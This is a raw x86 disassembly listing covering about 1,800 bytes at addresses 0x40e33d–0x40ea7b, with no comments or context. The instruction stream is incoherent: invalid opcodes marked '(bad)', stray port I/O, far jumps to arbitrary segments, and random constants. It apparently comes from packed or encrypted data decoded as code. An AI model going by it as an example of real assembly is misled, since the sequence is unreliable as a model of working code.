  40e33d:	adc    BYTE PTR [ecx+0x4d],cl
  40e340:	in     eax,0x0
  40e342:	scas   al,BYTE PTR es:[edi]
  40e343:	jo     0x40e31d
  40e345:	div    DWORD PTR [edx+0x2d0bb8c1]
  40e34b:	cmc    
  40e34c:	pop    edi
  40e34d:	add    DWORD PTR [edi-0x74],esi
  40e350:	inc    ebp
  40e351:	jo     0x40e2f7
  40e353:	test   esp,edx
  40e355:	into   
  40e356:	std    
  40e357:	mov    ecx,0x8237d12a
  40e35c:	in     al,dx
  40e35d:	pushf  
  40e35e:	(bad)  
  40e35f:	jmp    0xbf186223
  40e364:	stos   WORD PTR es:[edi],ax
  40e366:	cmp    DWORD PTR ds:0xd3bd364d,ebx
  40e36c:	sete   BYTE PTR [ecx-0x4]
  40e370:	shl    DWORD PTR [edx-0x15356469],0x1a
  40e377:	ins    DWORD PTR es:[edi],dx
  40e378:	xchg   DWORD PTR [ecx+0x31],ecx
  40e37b:	fs std 
  40e37d:	cwde   
  40e37e:	jne    0x40e310
  40e380:	jge    0x40e33c
  40e382:	add    eax,DWORD PTR [ebx]
  40e384:	jmp    0x40e3df
  40e386:	dec    esi
  40e387:	inc    ebp
  40e388:	xchg   BYTE PTR [esi-0x638df93a],bl
  40e38e:	sar    DWORD PTR [ecx+0x9a912c5],0xad
  40e395:	(bad)  
  40e396:	daa    
  40e397:	mov    ds:0x1b76bbbf,al
  40e39c:	in     eax,0x56
  40e39e:	bnd ret 0xcd67
  40e3a2:	sbb    BYTE PTR [esi+eax*8],ah
  40e3a5:	test   al,0xa0
  40e3a7:	rcr    BYTE PTR [esi-0x5b4d3745],0x32
  40e3ae:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40e3b0:	lds    ebx,FWORD PTR [ebx+ecx*2-0x75ac6412]
  40e3b7:	push   eax
  40e3b8:	iret   
  40e3b9:	imul   esp,ebx,0x3aa02318
  40e3bf:	lock mov ebp,0x3a65932c
  40e3c5:	mov    eax,0xf201ae9a
  40e3ca:	inc    esp
  40e3cb:	inc    eax
  40e3cc:	cmc    
  40e3cd:	push   esp
  40e3ce:	neg    DWORD PTR [ebx+0x59]
  40e3d1:	fisttp QWORD PTR [ecx+eax*1+0x21]
  40e3d5:	test   al,0x17
  40e3d7:	xchg   edi,eax
  40e3d8:	dec    ebx
  40e3d9:	lods   al,BYTE PTR ds:[esi]
  40e3da:	retf   0x607d
  40e3dd:	cmp    eax,0xb040c1d4
  40e3e2:	or     DWORD PTR [ecx],edx
  40e3e4:	rcr    BYTE PTR [esi+0x290b3f95],cl
  40e3ea:	in     al,0xf6
  40e3ec:	imul   esp,DWORD PTR ds:0xc1f32f55,0xffffffa9
  40e3f3:	leave  
  40e3f4:	test   BYTE PTR [ebx],dh
  40e3f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3f7:	mov    ecx,0x667e93e
  40e3fc:	fldenv [edx-0x55]
  40e3ff:	xor    bh,BYTE PTR gs:[ecx]
  40e402:	fldcw  WORD PTR [ecx+0x9]
  40e405:	arpl   WORD PTR [esi],dx
  40e407:	pop    esp
  40e408:	jmp    0xac664654
  40e40d:	pushf  
  40e40e:	pop    eax
  40e40f:	nop
  40e410:	js     0x40e39c
  40e412:	cmp    cl,0x54
  40e415:	cmp    al,0xdf
  40e417:	adc    ecx,esi
  40e419:	inc    esp
  40e41a:	jecxz  0x40e3e5
  40e41c:	std    
  40e41d:	lds    edi,FWORD PTR [ebp+esi*4-0x3d7c5e89]
  40e424:	jp     0x40e43d
  40e426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e427:	cdq    
  40e428:	pop    ebp
  40e429:	leave  
  40e42a:	leave  
  40e42b:	addr16 jle 0x40e3e4
  40e42e:	mov    ds:0xa2328683,eax
  40e433:	xor    al,0x2c
  40e435:	daa    
  40e436:	nop
  40e437:	mov    BYTE PTR [esi+ecx*4+0x140452d7],ch
  40e43e:	(bad)  
  40e43f:	or     ebp,DWORD PTR [ebx]
  40e441:	cmp    bl,BYTE PTR [ebx-0x5d]
  40e444:	out    dx,eax
  40e445:	xchg   esi,eax
  40e446:	sbb    al,0xc1
  40e448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e449:	test   ch,dh
  40e44b:	xchg   edx,eax
  40e44c:	xor    bl,0xe7
  40e44f:	das    
  40e450:	pop    esp
  40e451:	cmp    BYTE PTR [eax+esi*2+0x54],bl
  40e455:	push   ebx
  40e456:	add    ch,BYTE PTR [edx+0x66d9f6dc]
  40e45c:	fst    QWORD PTR [edi+eax*4+0x14]
  40e460:	sub    eax,0xe0a4d031
  40e465:	and    eax,0x5fb7a2c9
  40e46a:	pop    esp
  40e46b:	mov    DWORD PTR [edi-0x35],ebx
  40e46e:	pop    esi
  40e46f:	inc    esp
  40e470:	hlt    
  40e471:	or     edx,DWORD PTR [edi+0x42]
  40e474:	xor    eax,esp
  40e476:	mov    WORD PTR [ecx-0x25],gs
  40e479:	add    dl,al
  40e47b:	stos   DWORD PTR es:[edi],eax
  40e47c:	aam    0x8b
  40e47e:	call   0xb3a:0x3515ccac
  40e485:	iret   
  40e486:	jmp    0xc036:0x6189f333
  40e48d:	cmp    DWORD PTR [eax+0x6],edi
  40e490:	pop    esp
  40e491:	mov    dl,0x79
  40e493:	pop    edi
  40e494:	inc    eax
  40e495:	fisubr DWORD PTR [ebx]
  40e497:	aas    
  40e498:	bound  edx,QWORD PTR [edx-0x27]
  40e49b:	adc    dh,BYTE PTR [edx]
  40e49d:	nop
  40e49e:	call   0xae8a:0x61432550
  40e4a5:	jno    0x40e47b
  40e4a7:	pusha  
  40e4a8:	clc    
  40e4a9:	xor    cl,bl
  40e4ab:	fisub  DWORD PTR [edx-0x3e]
  40e4ae:	fisttp WORD PTR [edi+0x12822a34]
  40e4b4:	loopne 0x40e4d6
  40e4b6:	inc    ecx
  40e4b7:	cs mov ebx,ss
  40e4ba:	push   0x30
  40e4bc:	jnp    0x40e45c
  40e4be:	rol    DWORD PTR [esi],0xdf
  40e4c1:	cmp    ebp,DWORD PTR [edx-0x7b]
  40e4c4:	cmp    BYTE PTR [ebx],0x54
  40e4c7:	fdiv   st,st(7)
  40e4c9:	add    eax,0x5bbe7a9
  40e4ce:	push   eax
  40e4cf:	retf   0x9d3d
  40e4d2:	adc    eax,edi
  40e4d4:	scas   al,BYTE PTR es:[edi]
  40e4d5:	dec    esp
  40e4d6:	add    BYTE PTR [bx+di+0x55],dh
  40e4da:	pop    ecx
  40e4db:	lods   eax,DWORD PTR ds:[esi]
  40e4dc:	jmp    0x40e4ef
  40e4de:	out    0xb0,al
  40e4e0:	push   es
  40e4e1:	in     al,0x8
  40e4e3:	mov    dh,0x9e
  40e4e5:	xor    DWORD PTR [ecx],edi
  40e4e7:	in     al,0xf7
  40e4e9:	pop    esi
  40e4eb:	jmp    0x54cf:0xadd9c0ba
  40e4f2:	dec    ebp
  40e4f3:	dec    edi
  40e4f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4f5:	and    al,0xe6
  40e4f7:	jmp    0x40e4d4
  40e4f9:	push   0xffffffc5
  40e4fb:	imul   edi,DWORD PTR [ecx+0x6],0xffffffdd
  40e4ff:	and    DWORD PTR [eax+0x702bae4a],ebx
  40e505:	pop    ebx
  40e506:	lahf   
  40e507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e508:	add    bh,BYTE PTR [ebp-0xd]
  40e50b:	add    edi,DWORD PTR [esp+ebp*2+0x4c8581aa]
  40e512:	rol    esi,0xdc
  40e515:	ror    BYTE PTR [edx],1
  40e517:	mov    edx,0x91d0f6a7
  40e51c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e51d:	clc    
  40e51e:	sub    BYTE PTR [edi-0x9],ah
  40e521:	pushf  
  40e522:	cmc    
  40e523:	imul   edx,DWORD PTR [ebp+0x6],0x22
  40e527:	jl     0x40e509
  40e529:	out    0x12,al
  40e52b:	adc    dl,BYTE PTR [ebx]
  40e52d:	fwait
  40e52e:	cld    
  40e52f:	push   eax
  40e530:	and    ch,BYTE PTR [eax-0x56]
  40e533:	(bad)  [edi+edx*2]
  40e536:	jmp    0x40e51b
  40e538:	pop    ds
  40e539:	xchg   edx,eax
  40e53a:	repnz out 0x9d,al
  40e53d:	inc    ebx
  40e53e:	mov    ch,0xcc
  40e540:	outs   dx,BYTE PTR ds:[esi]
  40e541:	mov    ebp,DWORD PTR [eax+0x153035d]
  40e547:	mov    ds:0x2ce3b152,eax
  40e54c:	sbb    DWORD PTR [edi+0x45c17494],esp
  40e552:	or     edi,DWORD PTR [ebp+0x2f]
  40e555:	xchg   edi,eax
  40e556:	rcr    DWORD PTR [esi-0x245e92e2],1
  40e55c:	in     eax,0xda
  40e55e:	cmp    DWORD PTR [edi+0x5eb4682],esi
  40e564:	arpl   bx,si
  40e566:	hlt    
  40e567:	repnz dec edx
  40e569:	nop
  40e56a:	out    0x56,eax
  40e56c:	sub    BYTE PTR [edx+0x4],ah
  40e56f:	sbb    al,0xeb
  40e571:	popf   
  40e572:	fdiv   DWORD PTR [esi-0x5ff0b36f]
  40e578:	aam    0xda
  40e57a:	(bad)  
  40e57b:	or     eax,0xc54d8a61
  40e580:	and    ebp,eax
  40e582:	sub    bh,0xef
  40e585:	fstp   DWORD PTR [edx+0x78b58105]
  40e58b:	adc    al,0xa3
  40e58d:	or     ebx,DWORD PTR [ecx-0x433f752b]
  40e593:	test   eax,0xa250f58a
  40e598:	add    DWORD PTR [ebp-0x64],0x2c7c4ce7
  40e59f:	sbb    bl,BYTE PTR [edx]
  40e5a1:	xchg   ebx,eax
  40e5a2:	pop    ebp
  40e5a3:	imul   eax,ecx,0x5913950c
  40e5a9:	or     ecx,esp
  40e5ab:	hlt    
  40e5ac:	fwait
  40e5ad:	push   edi
  40e5ae:	pop    esi
  40e5af:	jae    0x40e5e6
  40e5b1:	mov    cl,0xc3
  40e5b3:	pop    es
  40e5b4:	adc    eax,0xe953862d
  40e5b9:	scas   al,BYTE PTR es:[edi]
  40e5ba:	lds    edi,FWORD PTR [edx+0x7f865202]
  40e5c0:	inc    edi
  40e5c1:	push   ebp
  40e5c2:	fidivr DWORD PTR [ebx+esi*4-0x3daede34]
  40e5c9:	icebp  
  40e5ca:	dec    eax
  40e5cb:	mov    dh,0x8f
  40e5cd:	lds    esi,FWORD PTR [edx]
  40e5cf:	stos   BYTE PTR es:[edi],al
  40e5d0:	pop    edx
  40e5d1:	xchg   edi,eax
  40e5d2:	and    ebp,esi
  40e5d4:	fidivr DWORD PTR [ebx]
  40e5d6:	push   edi
  40e5d7:	rcl    DWORD PTR [ebx+0x13],0x8b
  40e5db:	cdq    
  40e5dc:	cmp    al,0x41
  40e5de:	mov    edi,DWORD PTR es:[esi]
  40e5e1:	mov    al,ds:0x891722dc
  40e5e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5e7:	(bad)  
  40e5e8:	and    eax,DWORD PTR [edx+0x22dddbbb]
  40e5ee:	inc    edx
  40e5ef:	xchg   esp,eax
  40e5f0:	dec    ebp
  40e5f1:	jge    0x40e5ec
  40e5f3:	je     0x40e5d6
  40e5f5:	call   0x9d281fdc
  40e5fa:	jo     0x40e619
  40e5fc:	mov    eax,ds:0x48e91738
  40e601:	push   ebp
  40e602:	clc    
  40e603:	call   0xfa7b78e2
  40e608:	retf   0x3f8a
  40e60b:	push   0x6cd32428
  40e610:	cs std 
  40e612:	dec    ecx
  40e613:	sbb    al,0xbd
  40e615:	enter  0x2af6,0x5a
  40e619:	cdq    
  40e61a:	cmp    esp,DWORD PTR [edx-0x5b27a306]
  40e620:	inc    ebp
  40e621:	out    0x4b,eax
  40e623:	cmc    
  40e624:	out    0xb4,eax
  40e626:	shl    DWORD PTR [esi-0x5c],1
  40e629:	repnz fcmovnu st,st(5)
  40e62c:	mov    cl,0xe1
  40e62e:	xor    eax,0xccedd3a
  40e633:	dec    ebx
  40e634:	dec    ecx
  40e635:	ret    0xb74f
  40e638:	dec    esi
  40e639:	lea    ebx,[ecx]
  40e63b:	rcl    esp,1
  40e63d:	add    al,0x5c
  40e63f:	popf   
  40e640:	mov    ebx,cs
  40e642:	jg     0x40e677
  40e644:	inc    ebp
  40e645:	out    0xad,al
  40e647:	sub    al,BYTE PTR [eax-0x535dd86c]
  40e64d:	test   al,0xf7
  40e64f:	adc    BYTE PTR [eax],dh
  40e651:	inc    eax
  40e652:	jae    0x40e679
  40e654:	xchg   BYTE PTR [edi],ah
  40e656:	and    ebp,DWORD PTR [esi]
  40e658:	mov    cl,0xc
  40e65a:	out    dx,eax
  40e65b:	ins    DWORD PTR es:[edi],dx
  40e65c:	pop    ecx
  40e65d:	ret    0xa173
  40e660:	ret    0x1518
  40e663:	dec    BYTE PTR [esi-0x51]
  40e666:	push   es
  40e667:	push   esp
  40e668:	push   0xb75ecd0b
  40e66d:	rcl    ch,0xa
  40e670:	test   eax,0x9b40df46
  40e675:	push   edi
  40e676:	adc    eax,DWORD PTR [ecx]
  40e678:	pop    edi
  40e679:	repz test BYTE PTR [ebp+0x7d],0x15
  40e67e:	dec    ecx
  40e67f:	jle    0x40e6e0
  40e681:	pop    ebp
  40e682:	fsubr  st,st(1)
  40e684:	pop    edx
  40e685:	mov    esi,0xc9c4a785
  40e68a:	xor    dh,BYTE PTR [eax+0x1a533576]
  40e690:	xor    esp,DWORD PTR [esi+0x3915027f]
  40e696:	daa    
  40e697:	xchg   ebp,eax
  40e698:	fwait
  40e699:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e69a:	stos   BYTE PTR es:[edi],al
  40e69b:	arpl   WORD PTR [edx],bp
  40e69d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e69e:	das    
  40e69f:	mov    al,ds:0xccccefae
  40e6a4:	push   ds
  40e6a5:	fsin   
  40e6a7:	fisttp QWORD PTR [ebp-0x50]
  40e6aa:	pop    ds
  40e6ab:	aam    0x99
  40e6ad:	in     eax,0xbc
  40e6af:	nop
  40e6b0:	and    BYTE PTR [eax+0x3],0x74
  40e6b4:	xor    BYTE PTR [esi],0x30
  40e6b7:	in     al,0xba
  40e6b9:	mov    cl,dl
  40e6bb:	jg     0x40e6ac
  40e6bd:	mov    DWORD PTR es:[esi],ebx
  40e6c0:	add    al,0x16
  40e6c2:	retf   0x8f48
  40e6c5:	call   0x64f6:0xb868863b
  40e6cc:	add    esi,DWORD PTR [ebx+0x4]
  40e6cf:	mov    ebp,0xd1f2cca6
  40e6d4:	dec    edx
  40e6d5:	adc    eax,ecx
  40e6d7:	add    edi,DWORD PTR [edi]
  40e6d9:	mov    eax,ds:0x9ba1faa8
  40e6de:	ficomp WORD PTR [esi+0x6fa5b43a]
  40e6e4:	sbb    BYTE PTR [ecx],ah
  40e6e6:	xor    al,0xfb
  40e6e8:	ret    
  40e6e9:	mov    ds:0x3f0469f4,al
  40e6ee:	jmp    0x5eb5:0xc238c3cd
  40e6f5:	xor    eax,0x9c84f70f
  40e6fa:	push   edi
  40e6fb:	das    
  40e6fc:	das    
  40e6fd:	or     al,0x3
  40e6ff:	ror    DWORD PTR [edi-0x1],1
  40e702:	xor    al,BYTE PTR [ebx]
  40e704:	xchg   ebx,eax
  40e705:	hlt    
  40e706:	push   ebx
  40e707:	inc    edx
  40e708:	mov    bl,0x4
  40e70a:	xor    edx,DWORD PTR [ecx-0x61]
  40e70d:	xchg   DWORD PTR [esi-0x7e],esp
  40e710:	jo     0x40e700
  40e712:	mov    dh,0xc4
  40e714:	pop    ecx
  40e715:	pop    eax
  40e716:	fstp   DWORD PTR [ebp-0x80]
  40e719:	dec    eax
  40e71a:	leave  
  40e71b:	outs   dx,BYTE PTR gs:[esi]
  40e71d:	clc    
  40e71e:	jl     0x40e76c
  40e720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e721:	jl     0x40e790
  40e723:	retf   
  40e724:	dec    eax
  40e725:	lods   al,BYTE PTR ds:[esi]
  40e726:	pop    es
  40e727:	not    edx
  40e729:	adc    BYTE PTR [esi-0x27],0xb5
  40e72d:	pop    ebp
  40e72e:	mov    esi,0x61b6aa22
  40e733:	mov    dl,0x16
  40e735:	adc    bl,BYTE PTR [edx+0x287d59b9]
  40e73b:	inc    ebp
  40e73c:	mov    al,0x43
  40e73e:	mov    esp,DWORD PTR [edi+0xbd85e00]
  40e744:	ins    DWORD PTR es:[edi],dx
  40e745:	mov    ds:0x1c37840,al
  40e74a:	ds leave 
  40e74c:	in     al,0xc6
  40e74e:	fucomip st,st(4)
  40e750:	aas    
  40e751:	push   0x2db33102
  40e756:	stos   DWORD PTR es:[edi],eax
  40e757:	cwde   
  40e758:	pop    edi
  40e759:	out    0x2,al
  40e75b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e75c:	shr    DWORD PTR [edx+eax*8+0x3d551fff],0x17
  40e764:	cmp    cl,0x1e
  40e767:	aaa    
  40e768:	hlt    
  40e769:	into   
  40e76a:	les    eax,FWORD PTR [eax]
  40e76c:	jp     0x40e7cc
  40e76e:	repnz in al,dx
  40e770:	in     al,dx
  40e771:	loope  0x40e7c6
  40e773:	outs   dx,DWORD PTR ds:[esi]
  40e774:	arpl   WORD PTR [edx-0x5b],bp
  40e777:	adc    DWORD PTR [edi+0x2d3a4b9c],ecx
  40e77d:	add    ch,bl
  40e77f:	dec    edx
  40e780:	mov    ?,ebx
  40e782:	jle    0x40e7dc
  40e784:	fmul   DWORD PTR [edx]
  40e786:	stos   DWORD PTR es:[edi],eax
  40e787:	sbb    esi,eax
  40e789:	pop    ss
  40e78a:	cmp    al,0x73
  40e78c:	das    
  40e78d:	cmp    BYTE PTR [ebx-0x6a1966ed],bl
  40e793:	ins    BYTE PTR es:[edi],dx
  40e794:	or     dh,ch
  40e796:	int    0xd4
  40e798:	stos   BYTE PTR es:[edi],al
  40e799:	test   BYTE PTR [ebp-0x666057d3],0xcd
  40e7a0:	inc    ebx
  40e7a1:	xor    DWORD PTR [ecx-0xb],0xa
  40e7a5:	cmp    DWORD PTR [esi],edi
  40e7a7:	add    al,0x49
  40e7a9:	sbb    BYTE PTR [esi],ah
  40e7ab:	int3   
  40e7ac:	cmp    cl,BYTE PTR [ecx]
  40e7ae:	cmp    ah,BYTE PTR [edx]
  40e7b0:	mov    edi,0x8772a0c7
  40e7b5:	mov    ds:0x28948a04,al
  40e7ba:	sar    DWORD PTR ds:0x2b18be12,1
  40e7c0:	retf   0x1e18
  40e7c3:	test   al,0x2b
  40e7c5:	inc    ebp
  40e7c6:	push   es
  40e7c7:	cmc    
  40e7c8:	push   es
  40e7c9:	cdq    
  40e7ca:	sub    al,0x9c
  40e7cc:	or     eax,0x74958c5b
  40e7d1:	mov    ds:0x602809f0,eax
  40e7d6:	sar    DWORD PTR [edx-0x7ab1de46],cl
  40e7dc:	mov    ch,dl
  40e7de:	xchg   esi,eax
  40e7df:	jg     0x40e85b
  40e7e1:	cmp    eax,0xe467ad10
  40e7e6:	aam    0x16
  40e7e8:	out    0x50,al
  40e7ea:	int    0xee
  40e7ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7ed:	xor    dl,ch
  40e7ef:	dec    ecx
  40e7f0:	mov    bl,0xf8
  40e7f3:	cmp    eax,0x9e5b5446
  40e7f8:	jno    0x40e7aa
  40e7fa:	mov    eax,ds:0x766c29f9
  40e7ff:	test   DWORD PTR ds:0x64f4e0a6,ebp
  40e805:	cmp    al,cl
  40e807:	ret    
  40e808:	xor    cl,BYTE PTR [edx]
  40e80a:	(bad)  
  40e80b:	xor    eax,0xa4614d60
  40e810:	adc    al,0x82
  40e812:	mov    ebx,0xa22f3781
  40e817:	add    BYTE PTR [edx],dh
  40e819:	pop    ebx
  40e81a:	adc    eax,0x4c0a9de9
  40e81f:	pop    es
  40e820:	mov    ah,0xe1
  40e822:	add    DWORD PTR [edi-0x36],0x44
  40e826:	xchg   edi,eax
  40e827:	sbb    al,0x33
  40e829:	ss repz leave 
  40e82c:	inc    ebp
  40e82d:	jnp    0x40e864
  40e82f:	outs   dx,BYTE PTR ds:[esi]
  40e830:	cs xchg esi,edi
  40e833:	in     eax,0x43
  40e835:	cmova  eax,DWORD PTR [ebp-0x26]
  40e839:	pusha  
  40e83a:	inc    eax
  40e83b:	push   es
  40e83c:	in     al,0x20
  40e83e:	cmp    BYTE PTR [ecx-0x7b],0x70
  40e842:	jnp    0x40e899
  40e844:	scas   al,BYTE PTR es:[edi]
  40e845:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e846:	das    
  40e847:	ds clc 
  40e849:	iret   
  40e84a:	cdq    
  40e84b:	test   BYTE PTR [ebx-0x72db4a7c],0xa0
  40e852:	cmp    cl,BYTE PTR [ebx+0x52]
  40e855:	adc    BYTE PTR [ecx],dh
  40e857:	mov    bh,0xd
  40e859:	xchg   ch,ch
  40e85b:	or     DWORD PTR [edi+ebp*4+0x7],0x50294c38
  40e863:	xor    DWORD PTR [ecx+0x1d],0x8fac2027
  40e86a:	enter  0x927a,0x9d
  40e86e:	mov    esi,0xf11fb9f
  40e873:	dec    eax
  40e874:	test   eax,0xd1e9375c
  40e879:	test   BYTE PTR [edi+0x65dc68ad],0x4b
  40e880:	stos   DWORD PTR es:[edi],eax
  40e881:	add    DWORD PTR [edi],eax
  40e883:	sti    
  40e884:	cmp    bl,BYTE PTR [edx+0x68a45125]
  40e88a:	div    DWORD PTR [ebp-0x5d]
  40e88d:	movhps QWORD PTR [edi],xmm4
  40e890:	jno    0x40e8b6
  40e892:	mov    esi,0x9933fee4
  40e897:	mov    ds:0x9133972d,al
  40e89c:	in     eax,dx
  40e89d:	pusha  
  40e89e:	stos   BYTE PTR es:[edi],al
  40e89f:	pop    ebx
  40e8a0:	mov    cl,0x12
  40e8a2:	push   0xffffffba
  40e8a4:	pop    es
  40e8a5:	shl    esp,0xef
  40e8a8:	ror    DWORD PTR [esi-0x5888dfa],cl
  40e8ae:	retf   
  40e8af:	xor    ah,dh
  40e8b1:	jl     0x40e862
  40e8b3:	cmp    al,0x8b
  40e8b5:	call   0x63fafbcc
  40e8ba:	mov    eax,ds:0x1ada03ea
  40e8bf:	iret   
  40e8c0:	and    ah,ah
  40e8c2:	aam    0x69
  40e8c4:	lahf   
  40e8c5:	mov    esp,0x55b93ad7
  40e8ca:	std    
  40e8cb:	aad    0x45
  40e8cd:	test   edi,edi
  40e8cf:	jge    0x40e8d7
  40e8d1:	push   ebp
  40e8d2:	cdq    
  40e8d3:	in     eax,dx
  40e8d4:	jmp    0x40e919
  40e8d6:	jge    0x40e8c8
  40e8d8:	int3   
  40e8d9:	mov    dh,0xf
  40e8db:	test   BYTE PTR [ebx+0x79c8f332],ch
  40e8e1:	ins    BYTE PTR es:[edi],dx
  40e8e2:	stos   DWORD PTR es:[edi],eax
  40e8e3:	pop    esp
  40e8e4:	push   edx
  40e8e5:	aas    
  40e8e6:	mov    ebp,0x3b51e109
  40e8eb:	mov    DWORD PTR [edi+0x3e],eax
  40e8ee:	dec    ebp
  40e8ef:	jecxz  0x40e8f0
  40e8f1:	jnp    0x40e96b
  40e8f3:	out    0xdb,al
  40e8f5:	cli    
  40e8f6:	lock and BYTE PTR [ebx+0x39],al
  40e8fa:	inc    edi
  40e8fb:	add    ebx,eax
  40e8fd:	pop    esp
  40e8fe:	jne    0x40e943
  40e900:	mov    esp,0x57e43e7c
  40e905:	scas   eax,DWORD PTR es:[edi]
  40e906:	sub    dl,BYTE PTR [ecx]
  40e908:	inc    ecx
  40e909:	shl    DWORD PTR [ebp-0x53],0xe2
  40e90d:	and    DWORD PTR [esi],0x2646793b
  40e913:	mov    edx,0xf8023ca8
  40e918:	xlat   BYTE PTR ds:[ebx]
  40e919:	pop    ss
  40e91a:	sbb    BYTE PTR [edi],bh
  40e91c:	fmul   DWORD PTR [eax-0x7d]
  40e91f:	add    eax,0x9e15a943
  40e924:	push   es
  40e925:	dec    ecx
  40e926:	mov    ah,0xbe
  40e928:	mov    eax,0xb1d1dbc0
  40e92d:	xchg   ebp,eax
  40e92e:	xchg   edi,eax
  40e92f:	fwait
  40e930:	inc    esp
  40e931:	mov    DWORD PTR [ecx-0x60bdd73f],eax
  40e937:	and    al,0xe8
  40e939:	ins    BYTE PTR es:[edi],dx
  40e93a:	arpl   WORD PTR [ecx],dx
  40e93c:	aad    0x96
  40e93e:	clc    
  40e93f:	cmp    BYTE PTR [ecx+0xb38d0f1],ah
  40e945:	stos   BYTE PTR es:[edi],al
  40e946:	shl    DWORD PTR [ebp-0x19],1
  40e949:	retf   
  40e94a:	stos   BYTE PTR es:[edi],al
  40e94b:	call   0x7e37:0xd52d8d57
  40e952:	outs   dx,BYTE PTR ds:[esi]
  40e953:	adc    bh,BYTE PTR ds:0xdb3d6401
  40e959:	fs mov ah,cl
  40e95c:	mov    WORD PTR [ebp+ecx*4-0x5d49b05c],?
  40e963:	cli    
  40e964:	mov    edi,0xa9e6057b
  40e969:	arpl   si,bp
  40e96b:	and    DWORD PTR [edi+0x70468e30],esp
  40e971:	xor    BYTE PTR [ebx+0x2c],bl
  40e974:	push   cs
  40e975:	xor    eax,0x619b8024
  40e97a:	fstp   QWORD PTR [esi+edx*1]
  40e97d:	mov    ah,0xf5
  40e97f:	jmp    0x22bd:0x6b651779
  40e986:	xor    BYTE PTR [esi+eiz*2],cl
  40e989:	pop    ss
  40e98a:	int    0x6
  40e98c:	xchg   esi,eax
  40e98d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e98e:	mov    ebx,0x927ed62
  40e993:	and    edi,DWORD PTR [ebp+0x62]
  40e996:	std    
  40e997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e998:	int3   
  40e999:	loopne 0x40e934
  40e99b:	xor    BYTE PTR [ebx-0x80],bl
  40e99e:	pusha  
  40e99f:	or     eax,0xa1248e8b
  40e9a4:	or     eax,0x505f072
  40e9a9:	xlat   BYTE PTR ds:[ebx]
  40e9aa:	push   ss
  40e9ab:	pop    edx
  40e9ac:	(bad)  
  40e9ad:	scas   eax,DWORD PTR es:[edi]
  40e9ae:	add    ebx,DWORD PTR [ecx+edi*4-0x355df68a]
  40e9b5:	mov    bl,0x6d
  40e9b7:	pop    esp
  40e9b8:	sahf   
  40e9b9:	ja     0x40e97f
  40e9bb:	pop    ecx
  40e9bc:	outs   dx,BYTE PTR ds:[esi]
  40e9bd:	jbe    0x40e9e8
  40e9bf:	mov    bh,dh
  40e9c1:	hlt    
  40e9c2:	or     edi,edx
  40e9c4:	jo     0x40e9bd
  40e9c6:	dec    eax
  40e9c7:	sbb    esp,DWORD PTR [edx-0x57a11c60]
  40e9cd:	into   
  40e9ce:	dec    esp
  40e9cf:	call   0x5a41:0x425d7ce7
  40e9d6:	xor    al,0xdf
  40e9d8:	cmp    eax,0x8b71c841
  40e9dd:	ds retf 0xc6a9
  40e9e1:	and    DWORD PTR [esi+0x1cc00b76],edx
  40e9e7:	bound  ebx,QWORD PTR [edx-0x2d4e2096]
  40e9ed:	in     eax,0xa6
  40e9ef:	stos   BYTE PTR es:[edi],al
  40e9f0:	ficomp DWORD PTR [edi-0x3cd9eb93]
  40e9f6:	or     bl,bl
  40e9f8:	jge    0x40ea6c
  40e9fa:	stos   BYTE PTR es:[edi],al
  40e9fb:	imul   esi,esp,0xc20cb1b8
  40ea01:	(bad)  
  40ea02:	bound  esp,QWORD PTR [ecx+0x14]
  40ea05:	lods   al,BYTE PTR ds:[esi]
  40ea06:	sub    DWORD PTR [eax+ecx*2],ebx
  40ea09:	fldcw  WORD PTR [edi]
  40ea0b:	inc    ebx
  40ea0c:	popa   
  40ea0d:	xchg   DWORD PTR [ebx+0x6a],edx
  40ea10:	dec    ebp
  40ea11:	std    
  40ea12:	sub    edi,DWORD PTR [bx+si-0xe]
  40ea16:	clc    
  40ea17:	test   ah,ah
  40ea19:	mov    dl,0x62
  40ea1b:	lods   eax,DWORD PTR ds:[esi]
  40ea1c:	sub    esp,edi
  40ea1e:	mov    ebx,0xb4b370af
  40ea23:	imul   edi,DWORD PTR [edi+0x5d],0x466725cb
  40ea2a:	push   eax
  40ea2b:	hlt    
  40ea2c:	inc    ebp
  40ea2d:	int3   
  40ea2e:	sbb    BYTE PTR [edx+0x3],ah
  40ea31:	es ss ins DWORD PTR es:[edi],dx
  40ea34:	mov    edi,0xe8252411
  40ea39:	inc    ebp
  40ea3a:	out    0xa7,al
  40ea3c:	in     eax,dx
  40ea3d:	adc    ax,0x4b67
  40ea41:	fs rcr edx,0x3f
  40ea45:	mov    ah,0x9
  40ea47:	cwde   
  40ea48:	adc    esp,DWORD PTR [edx-0x5]
  40ea4b:	fcom   DWORD PTR [eax+0x4b270902]
  40ea51:	push   esi
  40ea52:	inc    ecx
  40ea53:	cmp    al,0x7f
  40ea55:	std    
  40ea56:	mov    al,ds:0x9011e66a
  40ea5b:	cmp    ch,BYTE PTR [ebp-0x4a]
  40ea5e:	dec    eax
  40ea5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea60:	push   ebp
  40ea61:	and    ecx,ecx
  40ea63:	inc    ebx
  40ea64:	sbb    edx,DWORD PTR [eax-0x7100fbb2]
  40ea6a:	fld    TBYTE PTR [edx]
  40ea6c:	sbb    esp,ebp
  40ea6e:	push   edi
  40ea6f:	and    al,0xa8
  40ea71:	dec    ecx
  40ea72:	inc    ebx
  40ea73:	dec    edx
  40ea74:	cmp    edx,DWORD PTR [esi+0x51]
  40ea77:	pop    ebx
  40ea78:	xchg   ecx,eax
  40ea79:	pop    edi
  40ea7a:	xchg   ebx,eax
  40ea7b:	push   esp
